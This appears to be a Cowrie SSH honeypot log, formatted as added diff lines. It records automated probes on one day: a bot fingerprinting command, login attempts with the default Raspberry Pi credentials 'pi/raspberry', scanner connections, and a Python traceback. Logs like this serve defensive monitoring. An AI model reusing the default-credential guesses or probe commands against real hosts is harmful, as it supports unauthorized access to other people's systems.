+2026-07-09T12:12:24.382936Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.382986Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383026Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383065Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383103Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383190Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe5'
+2026-07-09T12:12:24.383310Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383357Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383397Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383434Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383471Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383508Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383544Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383581Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383617Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383653Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383689Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383724Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383760Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383796Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383832Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383868Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383904Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383940Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.383976Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384012Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384048Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384084Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384120Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384156Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384192Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384228Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384264Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384304Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384340Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384376Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384411Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384448Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384485Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384521Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384557Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384592Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384629Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384665Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384701Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384737Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384772Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384807Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384843Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384880Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384916Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384951Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.384986Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.385021Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.385056Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.385092Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.385178Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xf7'
+2026-07-09T12:12:24.385222Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xb6'
+2026-07-09T12:12:24.385260Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xba'
+2026-07-09T12:12:24.385432Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd4'
+2026-07-09T12:12:24.385537Z [HoneyPotSSHTransport,55,123.57.51.183] CMD: echo 1 > /dev/null && cat /bin/echoQtd#0000
+2026-07-09T12:12:24.387233Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: echo 
+2026-07-09T12:12:24.387547Z [HoneyPotSSHTransport,55,123.57.51.183] Command found: cat /bin/echoQtd
+2026-07-09T12:12:24.388010Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388117Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388172Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388217Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388317Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x11'
+2026-07-09T12:12:24.388371Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x83'
+2026-07-09T12:12:24.388413Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388497Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xa0'
+2026-07-09T12:12:24.388584Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388628Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc8'
+2026-07-09T12:12:24.388711Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388756Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388795Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x9d'
+2026-07-09T12:12:24.388832Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388869Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388905Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388943Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.388979Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.389015Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.389051Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbb'
+2026-07-09T12:12:24.389087Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xfb'
+2026-07-09T12:12:24.389169Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xff'
+2026-07-09T12:12:24.389437Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.389491Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.389571Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.389620Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe9'
+2026-07-09T12:12:24.389660Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x17'
+2026-07-09T12:12:24.389738Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x1f'
+2026-07-09T12:12:24.389782Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdf'
+2026-07-09T12:12:24.389819Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdd'
+2026-07-09T12:12:24.389856Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xf6'
+2026-07-09T12:12:24.389892Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xed'
+2026-07-09T12:12:24.390063Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x83'
+2026-07-09T12:12:24.390112Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x13'
+2026-07-09T12:12:24.390222Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.390269Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x07'
+2026-07-09T12:12:24.390360Z [HoneyPotSSHTransport,55,123.57.51.183] CMD: >A@/`'8
+2026-07-09T12:12:24.390754Z [HoneyPotSSHTransport,55,123.57.51.183] exception: No closing quotation
+2026-07-09T12:12:24.390877Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x17'
+2026-07-09T12:12:24.391030Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x00'
+2026-07-09T12:12:24.391082Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdf'
+2026-07-09T12:12:24.391123Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd6'
+2026-07-09T12:12:24.391162Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xc6'
+2026-07-09T12:12:24.391199Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xbe'
+2026-07-09T12:12:24.391379Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x0f'
+2026-07-09T12:12:24.391471Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xa0'
+2026-07-09T12:12:24.391557Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xd7'
+2026-07-09T12:12:24.391641Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xb7'
+2026-07-09T12:12:24.391842Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xef'
+2026-07-09T12:12:24.392008Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xcb'
+2026-07-09T12:12:24.392097Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xa1'
+2026-07-09T12:12:24.392215Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdb'
+2026-07-09T12:12:24.392329Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x07'
+2026-07-09T12:12:24.392412Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xcf'
+2026-07-09T12:12:24.392458Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xdd'
+2026-07-09T12:12:24.392569Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xe4'
+2026-07-09T12:12:24.392846Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\xda'
+2026-07-09T12:12:24.392897Z [cowrie.shell.protocol.HoneyPotInteractiveProtocol#warn] Received unhandled keyID: b'\x07'
+2026-07-09T12:12:24.392946Z [HoneyPotSSHTransport,55,123.57.51.183] Received CTRL-D, exiting..
+2026-07-09T12:12:24.393024Z [twisted.conch.ssh.session#info] exitCode: 0
+2026-07-09T12:12:24.393072Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
+2026-07-09T12:12:24.395739Z [HoneyPotSSHTransport,55,123.57.51.183] Closing TTY Log: var/lib/cowrie/tty/e3dfdfbf5d97c42f1030954128b34371239d1915c421d6bc437d4dec0b5f6db6 after 3.9 seconds
+2026-07-09T12:12:24.396302Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 0
+2026-07-09T12:12:24.396429Z [HoneyPotSSHTransport,55,123.57.51.183] Unhandled Error
+	Traceback (most recent call last):
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/internet/posixbase.py", line 491, in _doReadOrWrite
+	    why = selectable.doRead()
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/internet/tcp.py", line 253, in doRead
+	    return self._dataReceived(data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/internet/tcp.py", line 258, in _dataReceived
+	    rval = self.protocol.dataReceived(data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/cowrie/ssh/transport.py", line 147, in dataReceived
+	    self.dispatchMessage(messageNum, packet[1:])
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/cowrie/ssh/transport.py", line 151, in dispatchMessage
+	    transport.SSHServerTransport.dispatchMessage(self, messageNum, payload)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/ssh/transport.py", line 805, in dispatchMessage
+	    self.service.packetReceived(messageNum, payload)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/ssh/service.py", line 54, in packetReceived
+	    return f(packet)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/ssh/connection.py", line 265, in ssh_CHANNEL_DATA
+	    channel.dataReceived(data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/ssh/session.py", line 165, in dataReceived
+	    self.client.transport.write(data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/ssh/session.py", line 225, in write
+	    self.proto.dataReceived(data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/cowrie/insults/insults.py", line 117, in dataReceived
+	    insults.ServerProtocol.dataReceived(self, data)
+	  File "/opt/cowrie/cowrie-env/lib64/python3.11/site-packages/twisted/conch/insults/insults.py", line 504, in dataReceived
+	    self.terminalProtocol.keystrokeReceived(ch, None)
+	builtins.AttributeError: 'NoneType' object has no attribute 'keystrokeReceived'
+	
+2026-07-09T12:12:24.405179Z [HoneyPotSSHTransport,55,123.57.51.183] avatar root logging out
+2026-07-09T12:12:24.405260Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T12:12:24.405317Z [HoneyPotSSHTransport,55,123.57.51.183] Connection lost after 10.7 seconds
+2026-07-09T12:22:18.453690Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 18.219.28.201:10890 (10.0.2.192:2222) [session: 8be40f1b8356]
+2026-07-09T12:22:18.454291Z [HoneyPotSSHTransport,56,18.219.28.201] Remote SSH version: 
+2026-07-09T12:22:18.454617Z [HoneyPotSSHTransport,56,18.219.28.201] Bad protocol version identification: b''
+2026-07-09T12:22:18.454798Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T12:22:18.454876Z [HoneyPotSSHTransport,56,18.219.28.201] Connection lost after 0.0 seconds
+2026-07-09T12:23:06.578054Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 18.219.28.201:48724 (10.0.2.192:2222) [session: 469d9fd17541]
+2026-07-09T12:23:06.578596Z [HoneyPotSSHTransport,57,18.219.28.201] Remote SSH version: SSH-2.0-Go
+2026-07-09T12:23:06.590615Z [HoneyPotSSHTransport,57,18.219.28.201] SSH client hassh fingerprint: e54ef3ec27fe1fea7ab64d3fa05359fd
+2026-07-09T12:23:06.591646Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ssh-ed25519'
+2026-07-09T12:23:06.591719Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T12:23:06.591771Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T12:23:06.604388Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T12:23:06.604679Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T12:23:06.604752Z [HoneyPotSSHTransport,57,18.219.28.201] Connection lost after 0.0 seconds
+2026-07-09T15:03:40.211267Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 109.195.19.44:36654 (10.0.2.192:2222) [session: 6d38b1052e99]
+2026-07-09T15:03:40.211837Z [HoneyPotSSHTransport,58,109.195.19.44] Remote SSH version: SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3
+2026-07-09T15:03:40.242434Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 109.195.19.44:36660 (10.0.2.192:2222) [session: 1a0cc54f94a4]
+2026-07-09T15:03:40.243184Z [HoneyPotSSHTransport,59,109.195.19.44] Remote SSH version: SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3
+2026-07-09T15:03:40.366682Z [HoneyPotSSHTransport,58,109.195.19.44] SSH client hassh fingerprint: 46c5bd9748882f1a5d75753fb7d47a61
+2026-07-09T15:03:40.367773Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T15:03:40.367844Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T15:03:40.367896Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T15:03:40.394125Z [HoneyPotSSHTransport,59,109.195.19.44] SSH client hassh fingerprint: 46c5bd9748882f1a5d75753fb7d47a61
+2026-07-09T15:03:40.395254Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T15:03:40.395323Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T15:03:40.395389Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T15:03:40.718708Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T15:03:40.734430Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T15:03:40.914708Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T15:03:40.922264Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2026-07-09T15:03:41.063387Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'none'
+2026-07-09T15:03:41.070409Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'none'
+2026-07-09T15:03:41.214633Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'
+2026-07-09T15:03:41.215166Z [HoneyPotSSHTransport,58,109.195.19.44] login attempt [b'pi'/b'raspberry'] failed
+2026-07-09T15:03:41.218009Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' trying auth b'password'
+2026-07-09T15:03:41.218358Z [HoneyPotSSHTransport,59,109.195.19.44] login attempt [b'pi'/b'raspberryraspberry993311'] failed
+2026-07-09T15:03:42.216957Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' failed auth b'password'
+2026-07-09T15:03:42.217158Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T15:03:42.219594Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'pi' failed auth b'password'
+2026-07-09T15:03:42.219765Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2026-07-09T15:03:42.366341Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T15:03:42.366517Z [HoneyPotSSHTransport,59,109.195.19.44] Connection lost after 2.1 seconds
+2026-07-09T15:03:42.367206Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T15:03:42.367283Z [HoneyPotSSHTransport,58,109.195.19.44] Connection lost after 2.2 seconds
+2026-07-09T16:16:48.048757Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 54.91.228.244:15408 (10.0.2.192:2222) [session: 8dd9944ffe16]
+2026-07-09T16:16:48.724721Z [HoneyPotSSHTransport,60,54.91.228.244] Remote SSH version: SSH-2.0-Go
+2026-07-09T16:16:48.725287Z [HoneyPotSSHTransport,60,54.91.228.244] SSH client hassh fingerprint: 9052c4ab4164c78256e71143dcfc7eac
+2026-07-09T16:16:48.726245Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T16:16:48.726310Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T16:16:48.726364Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2026-07-09T16:16:49.051259Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2026-07-09T16:16:49.051665Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T16:16:49.051769Z [HoneyPotSSHTransport,60,54.91.228.244] Connection lost after 1.0 seconds
+2026-07-09T16:33:02.248040Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 205.210.31.254:60132 (10.0.2.192:2222) [session: a6ee27461e3e]
+2026-07-09T16:33:03.308715Z [HoneyPotSSHTransport,61,205.210.31.254] Remote SSH version: SSH-2.0-ZGrab ZGrab SSH Survey
+2026-07-09T16:33:04.689657Z [HoneyPotSSHTransport,61,205.210.31.254] SSH client hassh fingerprint: dd9bcf093c355da7000132131cb36fd0
+2026-07-09T16:33:04.690607Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group-exchange-sha256' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T16:33:04.690675Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-md5' b'none'
+2026-07-09T16:33:04.690726Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-md5' b'none'
+2026-07-09T16:33:11.047789Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T16:33:11.047954Z [HoneyPotSSHTransport,61,205.210.31.254] Connection lost after 8.8 seconds
+2026-07-09T18:33:45.920998Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 67.205.152.202:41028 (10.0.2.192:2222) [session: 8bd0194adf94]
+2026-07-09T18:33:45.986229Z [HoneyPotSSHTransport,62,67.205.152.202] Remote SSH version: GET / HTTP/1.1
+2026-07-09T18:33:45.986693Z [HoneyPotSSHTransport,62,67.205.152.202] Bad protocol version identification: b'GET / HTTP/1.1'
+2026-07-09T18:33:45.987036Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T18:33:45.987127Z [HoneyPotSSHTransport,62,67.205.152.202] Connection lost after 0.1 seconds
+2026-07-09T18:33:46.019464Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 67.205.152.202:41034 (10.0.2.192:2222) [session: 727668bc81a5]
+2026-07-09T18:33:46.019996Z [HoneyPotSSHTransport,63,67.205.152.202] Remote SSH version: GET /favicon.ico HTTP/1.1
+2026-07-09T18:33:46.020294Z [HoneyPotSSHTransport,63,67.205.152.202] Bad protocol version identification: b'GET /favicon.ico HTTP/1.1'
+2026-07-09T18:33:46.020465Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2026-07-09T18:33:46.020527Z [HoneyPotSSHTransport,63,67.205.152.202] Connection lost after 0.0 seconds
+2026-07-09T22:01:18.110050Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 111.68.111.124:36526 (10.0.2.192:2222) [session: c1dd88a59ea6]
+2026-07-09T22:01:18.110614Z [HoneyPotSSHTransport,64,111.68.111.124] Remote SSH version: SSH-2.0-Go
+2026-07-09T22:01:18.333000Z [HoneyPotSSHTransport,64,111.68.111.124] SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6
+2026-07-09T22:01:18.333837Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ecdsa-sha2-nistp256'
+2026-07-09T22:01:18.333907Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
